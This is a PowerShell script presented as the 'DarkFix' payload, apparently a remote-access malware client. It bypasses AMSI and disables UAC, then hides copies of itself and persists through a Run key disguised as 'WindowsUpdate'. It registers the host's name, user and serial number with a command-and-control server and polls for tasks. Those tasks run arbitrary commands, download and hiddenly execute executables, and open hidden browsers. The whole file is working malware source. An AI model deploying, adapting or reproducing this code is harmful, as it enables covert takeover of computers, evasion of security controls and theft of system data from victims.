# DarkFix PowerShell Payload

# Helper Functions
$DropperURL = ''
$EnableDropper = $false



Start-Sleep -s 20

Write-Host "[*] Payload: Starting AMSI/ETW Bypass..." -ForegroundColor Yellow

# AMSI/ETW Bypass
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like '*AmsiUtils'){$c=$b.GetFields('NonPublic,Static');foreach($d in $c){if($d.Name -like '*amsiContext'){$d.SetValue($null,$null)}}}}
try {
    Write-Host "[*] Payload: Setting LUA (UAC)..." -ForegroundColor Yellow
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction SilentlyContinue
} catch {}

# Persistence and Installation
Write-Host "[*] Payload: Starting Persistence and Installation..." -ForegroundColor Yellow
try {
    $InstallDir = Join-Path $env:APPDATA "Microsoft\Windows\Templates"
    if (-not (Test-Path $InstallDir)) {
        New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
    }

    $StaticName = "WinSyncHost"
    $VbsPath = Join-Path $InstallDir "$StaticName.vbs"
    $Ps1Path = Join-Path $InstallDir "$StaticName.ps1"

    $CurrentScript = $MyInvocation.MyCommand.Path
    if (-not $CurrentScript -or ($CurrentScript.ToLower() -ne $Ps1Path.ToLower())) {
        if ($CurrentScript) {
            Copy-Item $CurrentScript $Ps1Path -Force
        } else {
            $MyInvocation.MyCommand.Definition | Set-Content -Path $Ps1Path -Force
        }
        
        $VbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File """ + $Ps1Path + """", 0, False'
        Set-Content -Path $VbsPath -Value $VbsContent -Force
        
        if (Test-Path $VbsPath) {
            attrib +h +s "$VbsPath"
            attrib +h +s "$Ps1Path"

            # Registry Persistence
            $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            Set-ItemProperty -Path $RegPath -Name "WindowsUpdate" -Value "wscript.exe //B ""$VbsPath""" -Force

            Start-Process "wscript.exe" -ArgumentList "//B", ([char]34 + $VbsPath + [char]34)
            exit
        }
    }
} catch {}

$ServerUrl = "http://127.0.0.1:8082"
$ApiEndpoint = "/api.jsp"
$RegisterEndpoint = "/sync_debug"
$ClientToken = "Demo"
$TrafficPrefix = "<!--"
$TrafficSuffix = "-->"

Write-Host "[*] DarkFix Beacon Initializing..." -ForegroundColor Cyan

function Send-Request {
    param($Endpoint, $Method = "GET", $Data = $null)
    $Url = "$ServerUrl$Endpoint"
    try {
        $Headers = @{
            "X-Request-ID" = $ClientToken
            "Content-Type" = "text/plain"
        }
        
        $Body = $null
        if ($Data) {
            $Body = "$TrafficPrefix$Data$TrafficSuffix"
        }

        if ($Method -eq "POST") {
            $Resp = Invoke-WebRequest -Uri $Url -Method Post -Headers $Headers -Body $Body -UseBasicParsing -TimeoutSec 30
            return $Resp.Content | ConvertFrom-Json
        } else {
            $Resp = Invoke-WebRequest -Uri $Url -Method Get -Headers $Headers -UseBasicParsing -TimeoutSec 30
            return $Resp.Content
        }
    } catch {
        return $null
    }
}

function Execute-Dropper {
    param($Url)
    $DebugFile = Join-Path $env:TEMP "df_debug.log"
    "[*] Dropper started for $Url" | Out-File $DebugFile -Append
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
        [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
        
        $TempFile = Join-Path $env:TEMP "sys_$(Get-Random).exe"
        $UserAgent = 'Mozilla/50 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        
        "[*] Attempting download to $TempFile" | Out-File $DebugFile -Append
        
        try {
            Start-BitsTransfer -Source $Url -Destination $TempFile -ErrorAction Stop -UserAgent $UserAgent
            "[*] BitsTransfer success" | Out-File $DebugFile -Append
        } catch {
            "[*] BitsTransfer failed, trying Invoke-WebRequest" | Out-File $DebugFile -Append
            try {
                Invoke-WebRequest -Uri $Url -OutFile $TempFile -UserAgent $UserAgent -UseBasicParsing -ErrorAction Stop -MaximumRedirection 10
                "[*] Invoke-WebRequest success" | Out-File $DebugFile -Append
            } catch {
                "[*] Invoke-WebRequest failed, trying WebClient" | Out-File $DebugFile -Append
                $wc = New-Object System.Net.WebClient
                $wc.Headers.Add("User-Agent", $UserAgent)
                $wc.DownloadFile($Url, $TempFile)
                "[*] WebClient success" | Out-File $DebugFile -Append
            }
        }
        
        if (Test-Path $TempFile) {
            $Size = (Get-Item $TempFile).Length
            "[*] File size: $Size" | Out-File $DebugFile -Append
            if ($Size -gt 1000) {
                Start-Process $TempFile -WindowStyle Hidden
                return "SUCCESS: Downloaded ($Size bytes) and executed $Url"
            } else {
                return "FAILURE: Downloaded file too small ($Size bytes). URL might be restricted."
            }
        } else {
            return "FAILURE: File not found after download from $Url"
        }
    } catch {
        "[*] ERROR: $($_.Exception.Message)" | Out-File $DebugFile -Append
        return "ERROR in dropper: $($_.Exception.Message)"
    }
}

# Registration
$OS = (Get-WmiObject Win32_OperatingSystem)
$RegData = @{
    hostname     = $env:COMPUTERNAME
    username     = $env:USERNAME
    process_name = "Payload.ps1"
    process_path = if ($MyInvocation.MyCommand.Path) { $MyInvocation.MyCommand.Path } else { "In-Memory" }
    process_id   = $PID
    arch         = if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
    os_uuid      = $OS.SerialNumber
} | ConvertTo-Json -Compress

Write-Host "[*] Payload: Registering with C2 server..." -ForegroundColor Yellow

$EncodedRegData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($RegData))
$RegResponse = Send-Request -Endpoint $RegisterEndpoint -Method "POST" -Data $EncodedRegData

Write-Host "[*] Payload: Registration response: $($RegResponse | ConvertTo-Json)" -ForegroundColor Yellow

if ($RegResponse -and $RegResponse.url) {
    $PollUrl = $RegResponse.url
    Write-Host "[*] Payload: Entering command execution loop. Polling URL: $PollUrl" -ForegroundColor Yellow
    
    # Command Execution Loop
    while ($true) {
        try {
            Start-Sleep -Seconds 10
            Write-Host "[*] Payload: Polling for tasks..." -ForegroundColor Yellow
            
            # Poll for tasks
            $Response = Send-Request -Endpoint $PollUrl -Method "GET"
            if (-not $Response) { continue }
            
            # Remove disguise
            $Task = $Response.Replace($TrafficPrefix, "").Replace($TrafficSuffix, "").Trim()
            if ([string]::IsNullOrWhiteSpace($Task)) { continue }
            Write-Host "[*] Payload: Executing task: $Task" -ForegroundColor Yellow
            
            $Output = ""
            if ($Task -match "^(http|https)://") {
                $Output = Execute-Dropper -Url $Task
            } elseif ($Task.Length -gt 1) {
                $TaskType = [int]$Task[0]
                $TaskPayload = $Task.Substring(1)
                
                if ($TaskType -eq 0x1E) { # TASK_DROPPER
                    $Output = Execute-Dropper -Url $TaskPayload
                } elseif ($TaskType -eq 0x1D) { # TASK_COMMAND
                    $Output = iex $TaskPayload 2>&1 | Out-String
                } elseif ($TaskType -eq 0x1F) { # TASK_VIDEO
                    $Url = $TaskPayload
                    $Launched = $false
                    $Browsers = @(
                        "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe",
                        "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
                        "${env:ProgramFiles}\BraveSoftware\Brave-Browser\Application\brave.exe",
                        "${env:ProgramFiles(x86)}\BraveSoftware\Brave-Browser\Application\brave.exe",
                        "${env:ProgramFiles}\Mozilla Firefox\firefox.exe",
                        "${env:ProgramFiles(x86)}\Mozilla Firefox\firefox.exe",
                        "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe"
                    )

                    foreach ($b in $Browsers) {
                        if (Test-Path $b) {
                            if ($b -match "chrome.exe" -or $b -match "brave.exe" -or $b -match "msedge.exe") {
                                Start-Process $b -ArgumentList "--headless=new", "--disable-gpu", "--no-sandbox", "--mute-audio", "--window-size=1280,720", $Url -WindowStyle Hidden -ErrorAction SilentlyContinue
                                $Launched = $true
                                break
                            } elseif ($b -match "firefox.exe") {
                                Start-Process $b -ArgumentList "-headless", "-new-instance", "-private-window", $Url -WindowStyle Hidden -ErrorAction SilentlyContinue
                                $Launched = $true
                                break
                            }
                        }
                    }

                    if (-not $Launched) {
                        Start-Process chrome.exe -ArgumentList "--headless=new", $Url -WindowStyle Hidden -ErrorAction SilentlyContinue
                    }
                    $Output = "Video play task started in hidden headless mode"
                } elseif ($TaskType -eq 0x20) { # TASK_MESSAGE
                    Add-Type -AssemblyName PresentationFramework
                    [System.Windows.MessageBox]::Show($TaskPayload, "System Update")
                    $Output = "Message box displayed"
                } else {
                    $Output = iex $Task 2>&1 | Out-String
                }
            } else {
                $Output = iex $Task 2>&1 | Out-String
            }
            
            if (-not $Output) { $Output = "Task completed with no output." }
            Write-Host "[*] Payload: Sending results..." -ForegroundColor Yellow
            
            # Send results (Base64 encoded)
            $EncodedOutput = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Output))
            Send-Request -Endpoint $PollUrl -Method "POST" -Data $EncodedOutput | Out-Null
            
        } catch {
            continue
        }
    }
}
